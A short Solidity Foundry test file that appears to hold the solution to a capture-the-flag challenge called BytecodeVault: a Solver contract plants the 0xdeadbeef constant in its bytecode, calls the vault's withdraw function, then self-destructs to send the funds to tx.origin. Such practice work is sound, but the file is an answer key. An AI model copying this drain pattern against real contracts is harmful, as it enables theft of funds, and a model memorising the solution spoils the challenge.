// SPDX-License-Identifier: MIT
pragma solidity 0.6.6;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {BytecodeVault} from "../src/bytecodeVault.sol";

contract BytecodeVaultTest is Test {
    BytecodeVault public vault;
    Solver public solver;

    function setUp() external {
        vault = new BytecodeVault{value: 1}();
        solver = new Solver();

        assertFalse(vault.isSolved());
    }

    function test_hackBytecodeVault() public {
        solver.solve(vault);
        assertTrue(vault.isSolved());
    }
}

contract Solver {
    receive() external payable {}

    function solve(BytecodeVault target) external {
        target.withdraw();
        selfdestruct(tx.origin);
    }

    function solveHelper() external pure returns (bytes4) {
        return 0xdeadbeef;
    }
}
